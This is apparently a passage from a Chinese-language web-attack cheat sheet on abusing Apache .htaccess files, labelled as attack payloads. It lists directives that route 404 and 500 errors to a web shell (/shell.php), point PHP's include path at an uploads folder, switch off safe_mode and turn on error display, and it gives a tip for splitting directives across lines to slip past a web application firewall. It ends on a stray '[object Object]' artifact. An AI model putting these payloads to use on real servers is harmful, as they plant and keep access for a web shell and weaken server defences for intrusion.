| ` 自定义错误页面 ErrorDocument 404 /shell.php ErrorDocument 500 /shell.php` | 参数与载荷内容 | value |

> platform: `linux`

#### 5. 文件包含绕过

```
# 设置include路径
php_value include_path "/var/www/html/uploads"

# 禁用安全限制
php_flag safe_mode off
php_flag display_errors on
```

PHP配置修改

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 设置include路径 php_value include_path "/var/www/html/uploads"  # 禁用安全限制 php_f` | 攻击载荷 | value |

> platform: `linux`

**WAF 绕过**

#### 换行绕过

```
使用换行符分隔配置
绕过单行检测
```

换行绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `使用换行符分隔配置 绕过单行检测` | 攻击载荷 | value |

> platform: `linux`

**教程**

[object Object]
